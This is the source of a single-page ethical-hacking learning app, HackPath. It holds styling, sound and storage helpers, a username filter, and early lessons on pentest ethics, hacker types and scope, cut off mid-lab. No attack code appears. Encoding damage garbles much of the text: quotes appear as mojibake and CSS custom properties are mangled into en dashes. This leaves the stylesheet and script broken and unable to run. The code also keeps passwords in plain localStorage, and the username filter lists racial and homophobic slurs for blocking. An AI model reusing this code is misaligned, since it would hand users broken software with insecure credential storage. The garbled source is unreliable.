<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>HackPath</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ğŸ›¡ï¸</text></svg>">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080c14;--bg2:#0c1220;--card:#111a2e;--card2:#162038;--card3:#1c2844;
  --border:#1e2d4a;--border2:#2a3f6a;
  --green:#34d399;--greenDim:rgba(52,211,153,.12);--greenGlow:rgba(52,211,153,.25);
  --red:#f87171;--redDim:rgba(248,113,113,.12);
  --blue:#60a5fa;--blueDim:rgba(96,165,250,.12);
  --cyan:#22d3ee;--cyanDim:rgba(34,211,238,.1);
  --gold:#fbbf24;--goldDim:rgba(251,191,36,.12);
  --purple:#a78bfa;--purpleDim:rgba(167,139,250,.1);
  --text:#e8edf5;--text2:#b4bfcf;--textDim:#6b7a94;
  --accent:linear-gradient(135deg,var(--green),var(--cyan));
}
html,body{margin:0;padding:0;min-height:100vh;min-height:100dvh;background:var(--bg);color:var(--text);font-family:'Outfit',sans-serif;overflow-x:hidden;-webkit-font-smoothing:antialiased}
#root{min-height:100vh;min-height:100dvh}
.hp{min-height:100vh;min-height:100dvh;max-width:520px;margin:0 auto;padding:16px 16px 80px}
.center{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;min-height:100dvh;gap:24px;max-width:440px;margin:0 auto;padding:20px}

/* Header */
.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 0 8px}
.logo{font-family:â€˜JetBrains Monoâ€™,monospace;font-size:1.05rem;font-weight:700;background:var(â€“accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hdr-r{display:flex;gap:6px;align-items:center}

/* Buttons */
.btn{background:var(â€“accent);color:#080c14;border:none;padding:11px 22px;border-radius:10px;font-weight:700;font-size:.88rem;cursor:pointer;font-family:â€˜Outfitâ€™,sans-serif;transition:all .15s;letter-spacing:.01em;-webkit-tap-highlight-color:transparent}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 20px var(â€“greenGlow)}
.btn:active{transform:scale(.97)}.btn:disabled{opacity:.35;cursor:default;transform:none;box-shadow:none}
.btn.sec{background:var(â€“card2);color:var(â€“text);border:1px solid var(â€“border)}
.btn.sec:hover{border-color:var(â€“border2);background:var(â€“card3)}
.btn.sm{padding:7px 14px;font-size:.8rem;border-radius:8px}.btn.full{width:100%}
.btn.icon-btn{width:36px;height:36px;padding:0;display:flex;align-items:center;justify-content:center;font-size:1rem;border-radius:10px;background:var(â€“card2);color:var(â€“text2);border:1px solid var(â€“border);transition:all .15s}
.btn.icon-btn:hover{border-color:var(â€“border2);color:var(â€“text);background:var(â€“card3);transform:translateY(-1px)}

/* Inputs */
.inp{background:var(â€“card);color:var(â€“text);border:1px solid var(â€“border);padding:12px 16px;border-radius:10px;font-size:.92rem;width:100%;font-family:â€˜JetBrains Monoâ€™,monospace;outline:none;transition:border-color .2s}
.inp:focus{border-color:var(â€“green);box-shadow:0 0 0 3px var(â€“greenDim)}
.inp::placeholder{color:var(â€“textDim)}

/* Animations */
.fadeIn{animation:fadeIn .35s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
.slideUp{animation:slideUp .4s cubic-bezier(.22,.68,0,1.1)}
@keyframes slideUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
.shake{animation:shake .4s ease}
@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}
.pulse{animation:pulse .45s ease}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.06)}100%{transform:scale(1)}}
.glow{box-shadow:0 0 24px var(â€“greenGlow)}
.starPop{display:inline-block;animation:starPop .5s ease both}
@keyframes starPop{0%{transform:scale(0) rotate(-180deg);opacity:0}70%{transform:scale(1.3) rotate(10deg);opacity:1}100%{transform:scale(1) rotate(0deg)}}
.popIn{animation:popIn .25s cubic-bezier(.22,.68,0,1.1)}
@keyframes popIn{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}

/* Cards */
.card{background:var(â€“card);border-radius:14px;padding:20px;border:1px solid var(â€“border);transition:border-color .2s}
.teach{background:linear-gradient(135deg,var(â€“card),var(â€“card2));border-color:var(â€“border);border-left:3px solid var(â€“cyan)}
.gap{display:flex;flex-direction:column;gap:12px}

/* Options */
.opt{display:block;width:100%;text-align:left;padding:13px 18px;background:var(â€“card2);border:1.5px solid var(â€“border);border-radius:10px;color:var(â€“text);font-size:.9rem;cursor:pointer;margin:5px 0;transition:all .15s;font-family:â€˜Outfitâ€™,sans-serif;-webkit-tap-highlight-color:transparent}
.opt:hover{border-color:var(â€“cyan);background:var(â€“cyanDim);transform:translateX(4px)}
.opt:active{transform:scale(.97)}
.opt.correct{border-color:var(â€“green);background:var(â€“greenDim);color:var(â€“green)}
.opt.wrong{border-color:var(â€“red);background:var(â€“redDim);color:var(â€“red)}

/* Progress bar */
.pbar{height:6px;background:var(â€“card);border-radius:3px;overflow:hidden}.pfill{height:100%;border-radius:3px;transition:width .4s}
.pfill-g{background:linear-gradient(90deg,var(â€“green),var(â€“cyan))}
.pfill-b{background:linear-gradient(90deg,var(â€“blue),var(â€“purple))}

/* Map nodes */
.mnode{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.9rem;cursor:pointer;border:2.5px solid transparent;font-family:â€˜JetBrains Monoâ€™,monospace;-webkit-tap-highlight-color:transparent}
.mnode.done{background:var(â€“greenDim);color:var(â€“green);border-color:var(â€“green)}
.mnode.done:hover{box-shadow:0 0 16px var(â€“greenGlow);transform:scale(1.08)}
.mnode.cur{background:var(â€“card2);border-color:var(â€“green);color:var(â€“green);box-shadow:0 0 20px var(â€“greenGlow)}
.mnode.cur:hover{box-shadow:0 0 28px var(â€“greenGlow);transform:scale(1.1)}
.mnode.lock{background:var(â€“card);border-color:var(â€“border);color:var(â€“textDim);cursor:default;opacity:.4}
.mnode.cp{border-radius:12px;width:auto;min-width:50px;padding:0 10px;background:var(â€“goldDim);border-color:var(â€“gold);color:var(â€“gold)}
.mnode.cp:not(.done):hover{box-shadow:0 0 16px rgba(251,191,36,.25);transform:scale(1.06)}
.mnode.cp.done{background:var(â€“greenDim);border-color:var(â€“green);color:var(â€“green)}
.mnode.lab{border-radius:12px;width:auto;min-width:50px;padding:0 10px;background:var(â€“cyanDim);border-color:var(â€“cyan);color:var(â€“cyan)}
.mnode.lab:not(.done):hover{box-shadow:0 0 16px rgba(34,211,238,.25);transform:scale(1.06)}
.mnode.lab.done{background:var(â€“greenDim);border-color:var(â€“green);color:var(â€“green)}

/* Badges */
.badge{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:6px;font-size:.72rem;font-weight:600;font-family:â€˜JetBrains Monoâ€™,monospace}
.badge-xp{background:var(â€“goldDim);color:var(â€“gold)}
.badge-level{background:var(â€“cyanDim);color:var(â€“cyan)}

/* OS tabs */
.osbtn{padding:16px;border-radius:12px;border:2px solid var(â€“border);background:var(â€“card);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.osbtn:hover{border-color:var(â€“border2);background:var(â€“card2);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.2)}
.osbtn:active{transform:scale(.96)}
.osbtn.sel{border-color:var(â€“green);background:var(â€“greenDim)}
.osbtn.sel:hover{box-shadow:0 0 16px var(â€“greenGlow)}
.ostab{padding:6px 12px;border-radius:8px;font-size:.75rem;cursor:pointer;border:1px solid var(â€“border);background:var(â€“card);color:var(â€“textDim);font-family:â€˜JetBrains Monoâ€™,monospace;transition:all .15s}
.ostab:hover{border-color:var(â€“border2);color:var(â€“text2)}
.ostab:active{transform:scale(.95)}
.ostab.active{background:var(â€“greenDim);border-color:var(â€“green);color:var(â€“green)}

/* Lab */
.labterm{background:#050a0f;border-radius:10px;padding:14px;font-family:â€˜JetBrains Monoâ€™,monospace;font-size:.75rem;line-height:1.7;max-height:240px;overflow-y:auto;border:1px solid #152015;box-shadow:inset 0 2px 8px rgba(0,0,0,.4)}
.labterm .p{color:#34d399}.labterm .o{color:#b4bfcf;white-space:pre-wrap}.labterm .h{color:#fbbf24;font-style:italic}.labterm .s{color:#34d399;font-weight:700}.labterm .f{color:#f87171}

/* Order items */
.oi{display:flex;align-items:center;gap:8px;padding:11px 14px;background:var(â€“card2);border:1px solid var(â€“border);border-radius:10px;margin:4px 0;font-size:.85rem;transition:all .15s}
.oi button{background:var(â€“card);border:1px solid var(â€“border);color:var(â€“text2);width:26px;height:22px;border-radius:5px;cursor:pointer;font-size:.65rem;display:flex;align-items:center;justify-content:center;transition:all .12s}
.oi button:hover{border-color:var(â€“blue);background:var(â€“blueDim);color:var(â€“blue)}
.oi button:active{transform:scale(.88)}

/* Match */
.mi{padding:11px 14px;border-radius:10px;cursor:pointer;font-size:.82rem;text-align:center;transition:all .15s;background:var(â€“card2);border:2px solid var(â€“border);-webkit-tap-highlight-color:transparent}
.mi:hover{border-color:var(â€“purple);background:var(â€“purpleDim);transform:translateY(-1px)}

/* Section headers */
.sec-hdr{padding:18px 0 6px;display:flex;align-items:center;gap:10px}
.sec-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.sec-info{flex:1}.sec-title{font-weight:700;font-size:.88rem}.sec-desc{font-size:.72rem;margin-top:2px}

/* Why text */
.why{font-size:.82rem;color:var(â€“text2);margin-top:8px;padding:10px 14px;background:var(â€“bg2);border-radius:8px;border-left:2px solid var(â€“green)}

/* Settings */
.set-group{margin-bottom:20px}
.set-label{font-size:.72rem;color:var(â€“textDim);text-transform:uppercase;letter-spacing:1px;font-weight:600;margin-bottom:10px}
.set-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:var(â€“card);border:1px solid var(â€“border);border-radius:12px;margin-bottom:8px;transition:all .15s}
.set-row.hoverable{cursor:pointer}.set-row.hoverable:hover{border-color:var(â€“border2);background:var(â€“card2)}
.set-row.hoverable:active{transform:scale(.98)}
.set-row.hover-blue:hover{border-color:var(â€“blue);background:var(â€“blueDim)}
.set-row.hover-gold:hover{border-color:var(â€“gold);background:var(â€“goldDim)}
.set-row.hover-red{cursor:pointer}.set-row.hover-red:hover{border-color:var(â€“red);background:var(â€“redDim)}
.set-row.hover-red:active{transform:scale(.98)}
.btn.danger{background:var(â€“card);color:var(â€“red);border:1px solid var(â€“border);transition:all .15s}
.btn.danger:hover{border-color:var(â€“red);background:var(â€“redDim);box-shadow:0 4px 16px rgba(248,113,113,.15);transform:translateY(-1px)}
.btn.danger:active{transform:scale(.97)}
.set-row .left{display:flex;align-items:center;gap:10px}
.set-row .left .icon{font-size:1.1rem;width:28px;text-align:center}
.set-row .left .label{font-size:.9rem;font-weight:500}
.set-row .left .sublabel{font-size:.72rem;color:var(â€“textDim)}
.toggle{width:44px;height:24px;border-radius:12px;background:var(â€“card3);border:1px solid var(â€“border);cursor:pointer;position:relative;transition:all .2s;-webkit-tap-highlight-color:transparent}
.toggle:hover{border-color:var(â€“border2);box-shadow:0 0 8px rgba(52,211,153,.15)}
.toggle:active{transform:scale(.92)}
.toggle.on{background:var(â€“green);border-color:var(â€“green)}
.toggle.on:hover{box-shadow:0 0 12px var(â€“greenGlow)}
.toggle::after{content:â€™â€™;position:absolute;width:18px;height:18px;border-radius:50%;background:white;top:2px;left:2px;transition:transform .2s}
.toggle.on::after{transform:translateX(20px)}
.theme-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.theme-opt{padding:14px;border-radius:12px;border:2px solid var(â€“border);cursor:pointer;text-align:center;transition:all .2s;-webkit-tap-highlight-color:transparent}
.theme-opt:hover{border-color:var(â€“border2);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.2)}
.theme-opt:active{transform:scale(.96)}
.theme-opt.sel{border-color:var(â€“green)}
.theme-opt.sel:hover{box-shadow:0 0 16px var(â€“greenGlow)}
.theme-dot{width:32px;height:32px;border-radius:50%;margin:0 auto 6px;border:2px solid rgba(255,255,255,.1)}
.slider-wrap{display:flex;align-items:center;gap:12px;padding:14px 16px;background:var(â€“card);border:1px solid var(â€“border);border-radius:12px}
.slider-wrap input[type=range]{flex:1;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;background:var(â€“card3);outline:none}
.slider-wrap input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;height:20px;border-radius:50%;background:var(â€“green);cursor:pointer;border:2px solid var(â€“bg)}
.slider-wrap input[type=range]::-moz-range-thumb{width:20px;height:20px;border-radius:50%;background:var(â€“green);cursor:pointer;border:2px solid var(â€“bg)}
.slider-val{font-family:â€˜JetBrains Monoâ€™,monospace;font-size:.8rem;color:var(â€“text2);min-width:32px;text-align:right}

/* Noise overlay */
body::before{content:â€™â€™;position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;opacity:.015;z-index:9999;
background-image:url(â€œdata:image/svg+xml,%3Csvg viewBox=â€˜0 0 256 256â€™ xmlns=â€˜http://www.w3.org/2000/svgâ€™%3E%3Cfilter id=â€˜nâ€™%3E%3CfeTurbulence type=â€˜fractalNoiseâ€™ baseFrequency=â€™.9â€™ numOctaves=â€˜4â€™ stitchTiles=â€˜stitchâ€™/%3E%3C/filter%3E%3Crect width=â€˜100%25â€™ height=â€˜100%25â€™ filter=â€˜url(%23n)â€™/%3E%3C/svg%3Eâ€)}

/* Bottom nav */
.bnav{position:fixed;bottom:0;left:0;right:0;background:var(â€“card);border-top:1px solid var(â€“border);display:flex;justify-content:center;gap:0;padding:6px 0 env(safe-area-inset-bottom,6px);z-index:100}
.bnav-btn{flex:1;max-width:120px;display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px 0;color:var(â€“textDim);font-size:.65rem;font-weight:600;cursor:pointer;transition:all .15s;-webkit-tap-highlight-color:transparent;background:none;border:none;font-family:â€˜Outfitâ€™,sans-serif}
.bnav-btn:hover{color:var(â€“text2)}
.bnav-btn:active{transform:scale(.9)}
.bnav-btn .ico{font-size:1.2rem;transition:transform .15s}
.bnav-btn:hover .ico{transform:translateY(-1px)}
.bnav-btn.active{color:var(â€“green)}
.bnav-btn.active:hover{color:var(â€“green)}
/* === QOL ADDITIONS === */
html{scroll-behavior:smooth}
.screen-fade{animation:screenFade .2s ease}
@keyframes screenFade{from{opacity:0}to{opacity:1}}
.lesson-progress{position:fixed;top:0;left:0;height:3px;background:var(â€“green);z-index:100;transition:width .4s cubic-bezier(.4,0,.2,1);border-radius:0 2px 2px 0}
.lesson-header{display:flex;align-items:center;gap:8px;padding:0 0 8px;margin-bottom:4px}
.lesson-header .back-btn{background:none;border:none;color:var(â€“textDim);font-size:1.1rem;cursor:pointer;padding:4px 8px;border-radius:8px;-webkit-tap-highlight-color:transparent;transition:all .15s}
.lesson-header .back-btn:hover{color:var(â€“text);background:var(â€“card2)}
.lesson-header .back-btn:active{background:var(â€“card3);transform:scale(.9)}
.lesson-header .ltitle{font-size:.72rem;color:var(â€“textDim);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lesson-header .round-count{font-size:.68rem;color:var(â€“textDim);font-family:â€˜JetBrains Monoâ€™,monospace}
.xp-toast{position:fixed;top:60px;right:16px;background:var(â€“gold);color:#000;font-weight:700;font-size:.82rem;padding:6px 14px;border-radius:20px;z-index:200;animation:xpToast 1.5s ease forwards;pointer-events:none}
@keyframes xpToast{0%{opacity:0;transform:translateY(10px)}15%{opacity:1;transform:translateY(0)}80%{opacity:1;transform:translateY(0)}100%{opacity:0;transform:translateY(-20px)}}
.map-progress{background:var(â€“bg2);border-radius:20px;height:6px;overflow:hidden;margin:8px 0 4px}
.map-progress-bar{height:100%;background:linear-gradient(90deg,var(â€“green),var(â€“cyan));border-radius:20px;transition:width .5s ease}
.streak-badge{display:inline-flex;align-items:center;gap:4px;background:var(â€“goldDim);color:var(â€“gold);padding:3px 10px;border-radius:12px;font-size:.72rem;font-weight:700}
.section-card{transition:all .15s ease}
.section-card:hover{border-color:var(â€“border2);box-shadow:0 4px 16px rgba(0,0,0,.15)}
.section-card:active{transform:scale(.98)}
.mnode{transition:transform .15s ease,box-shadow .2s ease,background .3s ease,color .3s ease,border-color .3s ease,opacity .3s ease}
.mnode:not(.lock):active{transform:scale(.9)}
.mnode{position:relative}
.mnode .tip{position:absolute;top:calc(100% + 8px);left:50%;transform:translateX(-50%) translateY(4px);background:var(â€“card2);color:var(â€“text);border:1px solid var(â€“border2);padding:5px 10px;border-radius:8px;font-size:.7rem;font-family:â€˜Outfitâ€™,sans-serif;font-weight:500;white-space:nowrap;pointer-events:none;opacity:0;transition:all .15s ease;z-index:50}
.mnode .tip::before{content:â€™â€™;position:absolute;bottom:100%;left:50%;transform:translateX(-50%);border:5px solid transparent;border-bottom-color:var(â€“border2)}
.mnode:hover .tip{opacity:1;transform:translateX(-50%) translateY(0)}
@media(prefers-reduced-motion:reduce){*{animation-duration:0.01ms!important;transition-duration:0.01ms!important}}
</style>

</head>
<body>
<div id="root"></div>
<script>
// === SOUNDS ===
var _ac=null,_vol=80,_sfxOn=true;
function ac(){if(!_ac)_ac=new(window.AudioContext||window.webkitAudioContext)();return _ac}
function beep(f,d,t,v){if(!_sfxOn)return;try{var c=ac(),o=c.createOscillator(),g=c.createGain();o.type=t||'sine';o.frequency.value=f;g.gain.value=(v||.15)*(_vol/100);o.connect(g);g.connect(c.destination);o.start();g.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.stop(c.currentTime+d)}catch(e){}}
var SFX={
  correct:function(){beep(523,.12);setTimeout(function(){beep(659,.12)},80);setTimeout(function(){beep(784,.15)},160)},
  wrong:function(){beep(200,.2,'sawtooth',.1);setTimeout(function(){beep(150,.25,'sawtooth',.08)},120)},
  complete:function(){beep(523,.1);setTimeout(function(){beep(659,.1)},100);setTimeout(function(){beep(784,.1)},200);setTimeout(function(){beep(1047,.2)},300)},
  tap:function(){beep(800,.05,'sine',.05)},
  levelup:function(){beep(392,.1);setTimeout(function(){beep(523,.1)},100);setTimeout(function(){beep(659,.1)},200);setTimeout(function(){beep(784,.15)},300)}
};

// === STORAGE ===
function sKey(u,k){return â€˜hp10-â€™+u+â€™-â€™+k}
function saveP(u,p){if(u===â€˜guestâ€™)return;try{localStorage.setItem(sKey(u,â€˜pâ€™),JSON.stringify(p))}catch(e){}}
function loadP(u){if(u===â€˜guestâ€™)return{};try{var r=localStorage.getItem(sKey(u,â€˜pâ€™));return r?JSON.parse(r):{}}catch(e){return{}}}
function saveOS(u,o){if(u===â€˜guestâ€™)return;try{localStorage.setItem(sKey(u,â€˜osâ€™),JSON.stringify(o))}catch(e){}}
function loadOS(u){if(u===â€˜guestâ€™)return null;try{var r=localStorage.getItem(sKey(u,â€˜osâ€™));return r?JSON.parse(r):null}catch(e){return null}}
function saveUser(u,p){try{localStorage.setItem(sKey(u,â€˜aâ€™),p)}catch(e){}}
function checkUser(u){try{return localStorage.getItem(sKey(u,â€˜aâ€™))}catch(e){return null}}
function saveSets(u,s){if(u===â€˜guestâ€™)return;try{localStorage.setItem(sKey(u,â€˜setâ€™),JSON.stringify(s))}catch(e){}}
function loadSets(u){if(u===â€˜guestâ€™)return{};try{var r=localStorage.getItem(sKey(u,â€˜setâ€™));return r?JSON.parse(r):{}}catch(e){return{}}}

// === THEMES ===
var THEMES={
dark:{name:â€˜Midnightâ€™,bg:â€™#080c14â€™,bg2:â€™#0c1220â€™,card:â€™#111a2eâ€™,card2:â€™#162038â€™,card3:â€™#1c2844â€™,border:â€™#1e2d4aâ€™,text:â€™#e8edf5â€™,text2:â€™#b4bfcfâ€™,textDim:â€™#6b7a94â€™,dot:â€™#111a2eâ€™},
hacker:{name:â€˜Hackerâ€™,bg:â€™#070f07â€™,bg2:â€™#0a150aâ€™,card:â€™#0f1f0fâ€™,card2:â€™#142a14â€™,card3:â€™#193519â€™,border:â€™#1e4a1eâ€™,text:â€™#c8f0c8â€™,text2:â€™#90c890â€™,textDim:â€™#507050â€™,dot:â€™#0f1f0fâ€™},
light:{name:â€˜Lightâ€™,bg:â€™#f0f2f5â€™,bg2:â€™#e8eaedâ€™,card:â€™#ffffffâ€™,card2:â€™#f5f7faâ€™,card3:â€™#eef0f4â€™,border:â€™#d0d5ddâ€™,text:â€™#1a1a2eâ€™,text2:â€™#4a5568â€™,textDim:â€™#8090a0â€™,dot:â€™#ffffffâ€™},
ocean:{name:â€˜Oceanâ€™,bg:â€™#0a1628â€™,bg2:â€™#0e1c32â€™,card:â€™#132240â€™,card2:â€™#18294aâ€™,card3:â€™#1e3258â€™,border:â€™#243c66â€™,text:â€™#e0eaf5â€™,text2:â€™#a8c0d8â€™,textDim:â€™#607890â€™,dot:â€™#132240â€™}
};
function applyTheme(t){
var th=THEMES[t]||THEMES.dark,r=document.documentElement.style;
r.setProperty(â€™â€“bgâ€™,th.bg);r.setProperty(â€™â€“bg2â€™,th.bg2);
r.setProperty(â€™â€“cardâ€™,th.card);r.setProperty(â€™â€“card2â€™,th.card2);r.setProperty(â€™â€“card3â€™,th.card3);
r.setProperty(â€™â€“borderâ€™,th.border);r.setProperty(â€™â€“textâ€™,th.text);r.setProperty(â€™â€“text2â€™,th.text2);r.setProperty(â€™â€“textDimâ€™,th.textDim);
document.body.style.background=th.bg;
}

// === UTILS ===
function shuffle(a){var b=a.slice();for(var i=b.length-1;i>0;iâ€“){var j=Math.floor(Math.random()*(i+1));var t=b[i];b[i]=b[j];b[j]=t}return b}
function esc(s){var d=document.createElement(â€˜divâ€™);d.textContent=s;return d.innerHTML}

// === USERNAME CHECK ===
var BLOCKED_EXACT=[â€œniggerâ€,â€œniggaâ€,â€œnigg3râ€,â€œn1ggerâ€,â€œn1ggaâ€,â€œfaggotâ€,â€œf4ggotâ€,â€œfagâ€,â€œkikeâ€,â€œk1keâ€,â€œchinkâ€,â€œch1nkâ€,â€œspicâ€,â€œsp1câ€,â€œwetbackâ€,â€œgookâ€,â€œragheadâ€,â€œtowelheadâ€,â€œcoonâ€,â€œdarkieâ€,â€œbeanerâ€,â€œtrannyâ€,â€œretardâ€,â€œr3tardâ€];
var BLOCKED_SUBSTR=[â€œniggerâ€,â€œniggaâ€,â€œnigg3râ€,â€œn1ggerâ€,â€œn1ggaâ€];
function checkUName(name){
var low=name.toLowerCase().replace(/\s+/g,â€™â€™);
if(low.length<2)returnâ€™Username must be at least 2 charactersâ€™;
if(low.length>24)returnâ€™Max 24 charactersâ€™;
if(!/^[a-zA-Z0-9_.-]+$/.test(name.trim()))returnâ€™Letters, numbers, _ . - onlyâ€™;
for(var i=0;i<BLOCKED_SUBSTR.length;i++)if(low.indexOf(BLOCKED_SUBSTR[i])!==-1)returnâ€That username isnâ€™t allowedâ€;
var words=low.replace(/[_.-0-9]/g,â€™ â€˜).split(/\s+/);
for(var i=0;i<words.length;i++)if(BLOCKED_EXACT.indexOf(words[i])!==-1)returnâ€That username isnâ€™t allowedâ€;
return null;
}

// ============================================================
// SECTION 1: FOUNDATIONS (Beginner)
// ============================================================
var SEC1 = {
id:â€œs1â€,title:â€œFoundationsâ€,tier:â€œbasicâ€,icon:â€\uD83D\uDEE1\uFE0Fâ€,color:â€œvar(â€“green)â€,
desc:â€œEthics, terminal, Linux, and networkingâ€,
units:[
// â€“â€“ UNIT 1: ETHICS â€“â€“
{id:â€œu1â€,title:â€œEthics & Mindsetâ€,desc:â€œLegal rules and hacker typesâ€,levels:[
{id:â€œu1l1â€,title:â€œWhat is Ethical Hacking?â€,rounds:[
{type:â€œteachâ€,text:â€œEthical hacking means being hired to break into systems \u2014 legally, with written permission. Imagine a bank paying you to try to rob them so they can fix the weak spots before a real criminal finds them. Thatâ€™s basically the job.â€,detail:â€œOther names for this job: Penetration Tester, Security Consultant, Red Teamer, Bug Bounty Hunter.\nAverage salary: $90,000 - $150,000+ per year.\nYou donâ€™t need a college degree \u2014 certifications and skills matter more.â€},
{type:â€œteachâ€,text:â€œBanks, hospitals, tech companies, and even governments hire ethical hackers. Your job is to think like a criminal, find every security hole, then write a report explaining what you found and how to fix it. You NEVER steal or damage anything.â€,detail:â€œThe key difference between a criminal hacker and you: a signed piece of paper giving you permission.\nWithout that paper, the EXACT same actions are a serious crime.\nWith it, youâ€™re a highly paid professional.â€},
{type:â€œpickâ€,q:â€œWhy do companies PAY hackers to break into their own systems?â€,opts:[â€œTo find security holes before criminals doâ€,â€œTo spy on their competitorsâ€,â€œTo build their websiteâ€,â€œTo install antivirus softwareâ€],a:â€œTo find security holes before criminals doâ€,why:â€œItâ€™s cheaper to pay a friendly hacker $10K to find a hole than lose $10 million when a criminal finds it first.â€},
{type:â€œtfâ€,q:â€œEthical hackers can test any system they want, anytime.â€,a:false,why:â€œYou MUST have written permission before testing anything. Without it, even â€˜helpfulâ€™ hacking is a crime.â€}
]},
{id:â€œu1l2â€,title:â€œTypes of Hackersâ€,rounds:[
{type:â€œteachâ€,text:â€œWhite Hat = hired with permission, like a locksmith testing a bankâ€™s locks. Black Hat = criminals who steal data. Grey Hat = finds bugs without asking \u2014 still illegal, no permission.â€},
{type:â€œpickâ€,q:â€œA locksmith hired by a bank to test their locks is most like a:â€,opts:[â€œWhite Hat \u2014 legal and hiredâ€,â€œBlack Hat \u2014 criminalâ€,â€œGrey Hat \u2014 no permissionâ€,â€œScript Kiddie \u2014 using tools blindlyâ€],a:â€œWhite Hat \u2014 legal and hiredâ€,why:â€œWhite Hats have written permission. Thatâ€™s what makes them legal.â€},
{type:â€œteachâ€,text:â€œScript Kiddies download hacking tools and run them without understanding how they work. Red Teams are hired attackers who simulate real break-ins. Blue Teams are the defenders who try to stop them. Purple Teams do both attack AND defense.â€,detail:â€œWhite Hat = Legal hacker with permission (pen tester, security consultant).\nBlack Hat = Criminal hacker, no permission, steals data.\nGrey Hat = No permission but doesnâ€™t steal \u2014 still illegal.\nScript Kiddie = Runs tools without understanding them.\nRed Team = Simulates attackers (offensive).\nBlue Team = Defends against attacks (defensive).\nPurple Team = Combines red and blue (both sides).â€},
{type:â€œmatchâ€,q:â€\uD83C\uDFA9 Match the hat to the hacker:â€,pairs:[[â€œWhite Hat \uD83E\uDD20â€,â€œLegal, hired to testâ€],[â€œBlack Hat \uD83D\uDC80â€,â€œCriminal, steals dataâ€],[â€œGrey Hat \uD83D\uDC7Bâ€,â€œNo permission, no theftâ€],[â€œRed Team \uD83D\uDD34â€,â€œSimulates real attacksâ€]],why:â€œEach type plays a different role in cybersecurity. White and Red are legal, Black is criminal.â€},
]},
{id:â€œu1l3â€,title:â€œLegal Rules & 5 Phasesâ€,rounds:[
{type:â€œteachâ€,text:â€œBefore hacking anything, you need paperwork. Scope = which systems you can test. ROE (Rules of Engagement) = what methods are allowed. NDA = you keep everything secret.â€},
{type:â€œteachâ€,text:â€œEvery hack follows 5 steps: 1) Recon = scout from distance. 2) Scanning = check every door. 3) Exploitation = pick the weakest lock. 4) Post-Exploitation = find the treasure. 5) Reporting = write down how you got in.â€},
{type:â€œorderâ€,q:â€œPut the 5 pentest phases in order:â€,items:[â€œReconnaissanceâ€,â€œScanningâ€,â€œExploitationâ€,â€œPost-Exploitationâ€,â€œReportingâ€],why:â€œAlways follow this order. Never exploit before you scan.â€},
{type:â€œscenarioâ€,situation:â€œA friend asks you to hack their exâ€™s Instagram to see if theyâ€™re cheating.â€,q:â€œWhat do you do?â€,opts:[â€œRefuse \u2014 unauthorized access is illegalâ€,â€œHelp them, itâ€™s for a good causeâ€,â€œDo it but donâ€™t tell anyoneâ€,â€œOnly if they pay youâ€],a:â€œRefuse \u2014 unauthorized access is illegalâ€,why:â€œAccessing someoneâ€™s account without consent is a crime regardless of reason.â€},
]},
// LAB
{id:â€œu1labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Ethics Decisionsâ€,rounds:[
{type:â€œlabâ€,title:â€œEthics Decisionsâ€,objective:â€œNavigate ethical scenarios a pentester faces on the job.â€,banner:â€œWelcome to MegaCorp Security Consulting\nYour first day as a junior pentester.\nâ€,steps:[
{hint:â€œYour manager hands you a scope document. Whatâ€™s the first thing you check?â€,accept:[â€œ~scopeâ€,â€œ~systemsâ€,â€œ~targetâ€,â€œwhat systemsâ€,â€œwhich systemsâ€],output:â€œScope document: Test authorized for:\n- 10.10.10.0/24 (web servers)\n- portal.megacorp.com\nOUT OF SCOPE: Database servers, employee workstationsâ€,successMsg:â€œAlways read the scope FIRST. It defines your legal boundaries.â€,example:â€œwhat systems can I testâ€,quickCmds:[â€œwhat systems can I testâ€]},
{hint:â€œYou accidentally discover a vulnerability on 10.10.20.5 which is OUT of scope. What do you do?â€,accept:[â€œ~reportâ€,â€œ~noteâ€,â€œ~documentâ€,â€œ~tellâ€,â€œ~managerâ€,â€œ~stopâ€],output:â€œGood call. You documented it and told your manager.\nTheyâ€™ll contact the system owner through proper channels.â€,successMsg:â€œNever exploit out-of-scope findings. Document and report to your team lead.â€,example:â€œreport to managerâ€,quickCmds:[â€œreport to managerâ€,â€œdocument and stopâ€]},
